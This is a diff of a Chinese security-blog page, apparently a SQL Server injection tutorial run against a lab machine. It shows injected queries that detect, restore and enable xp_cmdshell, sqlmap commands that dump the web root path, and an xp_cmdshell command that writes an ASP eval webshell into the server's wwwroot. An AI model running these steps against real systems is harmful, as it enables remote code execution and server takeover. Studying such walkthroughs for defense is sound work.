@@ -10,13 +10,13 @@
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &amp;#39;x&amp;#39; and name =&amp;#39">
+  <meta name="description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; and name =&apos;xp_cmdshell">
 <meta name="keywords" content="注入,Web安全,sql server">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL SERVER 注入（三）">
 <meta property="og:url" content="http://klforever.cn/2019/10/14/8/index.html">
 <meta property="og:site_name" content="WLSMILE Blog">
-<meta property="og:description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &amp;#39;x&amp;#39; and name =&amp;#39">
+<meta property="og:description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; and name =&apos;xp_cmdshell">
 <meta property="og:locale" content="cn">
 <meta property="og:image" content="http://klforever.cn/images/8/1.png">
 <meta property="og:image" content="http://klforever.cn/images/8/2.png">
@@ -28,10 +28,10 @@
 <meta property="og:image" content="http://klforever.cn/images/8/7.png">
 <meta property="og:image" content="http://klforever.cn/images/8/8.png">
 <meta property="og:image" content="http://klforever.cn/images/8/9.png">
-<meta property="og:updated_time" content="2021-04-25T07:36:27.361Z">
+<meta property="og:updated_time" content="2021-04-25T09:07:31.200Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL SERVER 注入（三）">
-<meta name="twitter:description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &amp;#39;x&amp;#39; and name =&amp;#39">
+<meta name="twitter:description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; and name =&apos;xp_cmdshell">
 <meta name="twitter:image" content="http://klforever.cn/images/8/1.png">
   
     <link rel="alternative" href="/atom.xml" title="WLSMILE Blog" type="application/atom+xml">
@@ -55,14 +55,15 @@
 
   
     
- 	  <script src="/lib/clickLove.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+ 	  <script src="/lib/clickLove.js"></script>
   
   
 
 
   
 
-</head>
+<link rel="stylesheet" href="/css/prism-hopscotch.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 <body>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container" q-class="show:isCtnShow">
@@ -229,7 +230,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">666字</span>
+      <span class="post-count">635字</span>
     </span>
   </span>
 
@@ -250,18 +251,22 @@
   <div class="article-entry" itemprop="articleBody">
     
     <h1 id="开启xp-cmdshell获取webshell"><a href="#开启xp-cmdshell获取webshell" class="headerlink" title="开启xp_cmdshell获取webshell"></a>开启xp_cmdshell获取webshell</h1><p>xp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell</p>
-<pre><code>;if(1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name =&#39;xp_cmdshell&#39;)) WAITFOR DELAY &#39;0:0:5&#39;</code></pre><p>如果延迟 5s后返回正常页面的话则判断存在组件 xp_cmdshell。<br>如果删除了xp_cmdshell 组件的话可以用下面的命令恢复</p>
-<pre><code>恢复／删除 xp_cmdshell
-exec sp_addextendedproc xp_cmdshell,@dllname=&#39;xplog70.dll&#39;
-exec sp_dropextendedproc &#39;xplog70.dll&#39;</code></pre><p>关闭xp_cmdshell</p>
-<pre><code>EXEC sp_configure &#39;show advanced options&#39;,1;
-RECONFIGURE;
-EXEC sp_configure &#39;xp_cmdshell&#39;,0;
-RECONFIGURE;</code></pre><p>启用xp_cmdshell</p>
-<pre><code>EXEC sp_configure &#39;show advanced options&#39;,1;
-RECONFIGURE;
-EXEC sp_configure &#39;xp_cmdshell&#39;,1;
-RECONFIGURE;</code></pre><p>成功开启 xp_cmdshell 之后，我们要进行的最重要的一步就是找到网站的根路径，这里也<br>是较难的一点。下面有三种方法：</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> from master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects where xtype <span class="token operator">=</span> <span class="token string">'x'</span> and name <span class="token operator">=</span><span class="token string">'xp_cmdshell'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> WAITFOR DELAY <span class="token string">'0:0:5'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>如果延迟 5s后返回正常页面的话则判断存在组件 xp_cmdshell。<br>如果删除了xp_cmdshell 组件的话可以用下面的命令恢复</p>
+<pre class="line-numbers language-java"><code class="language-java">恢复／删除 xp_cmdshell
+exec sp_addextendedproc xp_cmdshell<span class="token punctuation">,</span><span class="token annotation punctuation">@dllname</span><span class="token operator">=</span><span class="token string">'xplog70.dll'</span>
+exec sp_dropextendedproc <span class="token string">'xplog70.dll'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>关闭xp_cmdshell</p>
+<pre class="line-numbers language-java"><code class="language-java">EXEC sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
+RECONFIGURE<span class="token punctuation">;</span>
+EXEC sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>
+RECONFIGURE<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>启用xp_cmdshell</p>
+<pre class="line-numbers language-java"><code class="language-java">EXEC sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
+RECONFIGURE<span class="token punctuation">;</span>
+EXEC sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
+RECONFIGURE<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功开启 xp_cmdshell 之后，我们要进行的最重要的一步就是找到网站的根路径，这里也<br>是较难的一点。下面有三种方法：</p>
 <ul>
 <li>找到报错页面得到物理路径，如 404页面</li>
 <li>查找网站文件并把路径写入到临时表当中</li>
@@ -271,17 +276,22 @@ RECONFIGURE;</code></pre><p>成功开启 xp_cmdshell 之后，我们要进行的
 <p><img src="/images/8/1.png" alt></p>
 <p>2.在大佬博客上看到的找物理路径的方法是找到一个网站文件，将其路径写入临时表后再使<br>用sqlmap跑出来。具体思路如下:</p>
 <p>在数据库 tempdb创建临时表temp</p>
-<pre><code>;use test;create table tt_tmp (tmp1 varchar(1000));</code></pre><p><img src="/images/8/2.png" alt></p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">;</span>use test<span class="token punctuation">;</span>create table <span class="token function">tt_tmp</span> <span class="token punctuation">(</span>tmp1 <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/8/2.png" alt></p>
 <p>创建完成之后使用 sqlmap 可以看到成功创建表temp</p>
 <p>Sqlmap命令: </p>
-<pre><code>python27 sqlmap.py-u&quot;192.168.10.19/char.asp?id=1&quot;-D test --tables</code></pre><p><img src="/images/8/3.png" alt></p>
+<pre class="line-numbers language-java"><code class="language-java">python27 sqlmap<span class="token punctuation">.</span>py<span class="token operator">-</span>u<span class="token string">"192.168.10.19/char.asp?id=1"</span><span class="token operator">-</span>D test <span class="token operator">--</span>tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/8/3.png" alt></p>
 <p>之后我们将char.asp文件的路径写入到该字段当中</p>
-<pre><code>;use test;insert into tt_tmp(tmp1) exec master..xp_cmdshell &#39;dir /s /b c:\char.asp&#39;;</code></pre><p><img src="/images/8/4.png" alt></p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">;</span>use test<span class="token punctuation">;</span>insert into <span class="token function">tt_tmp</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">)</span> exec master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'dir /s /b c:\char.asp'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/8/4.png" alt></p>
 <p>这个语句回车之后的响应时间会稍微长一点，是因为将很数据插入到表中需要一定时间</p>
 <p>Sqlmap命令:</p>
-<pre><code>python27 sqlmap.py -u &quot;192.168.10.19/char.asp?id=1&quot; -D test -T tt_tmp -C tmp1 --dump</code></pre><p><img src="/images/8/5.png" alt></p>
+<pre class="line-numbers language-python"><code class="language-python">python27 sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"192.168.10.19/char.asp?id=1"</span> <span class="token operator">-</span>D test <span class="token operator">-</span>T tt_tmp <span class="token operator">-</span>C tmp1 <span class="token operator">-</span><span class="token operator">-</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/8/5.png" alt></p>
 <p>这样我们成功的查询到了网站的根路径，随后我们尝试写入一句话</p>
-<pre><code>;exec master..xp_cmdshell &#39;echo ^&lt;script language=vbs runat=server^&gt;eval(request(&quot;c&quot;))^&lt;/script^&gt; &gt; c:\\inetpub\\wwwroot\\shell.asp&#39;;</code></pre><p>执行之后返回正常界面，我们访问 192.168.10.19/shell.asp 观察</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">;</span><span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'echo ^&lt;script language=vbs runat=server^>eval(request("c"))^&lt;/script^> > c:\\inetpub\\wwwroot\\shell.asp'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>执行之后返回正常界面，我们访问 192.168.10.19/shell.asp 观察</p>
 <p><img src="/images/8/6.png" alt></p>
 <p>返回状态码200，asp,内容已经被成功解析，查看靶机是否被成功写入。</p>
 <p><img src="/images/8/6.png" alt></p>
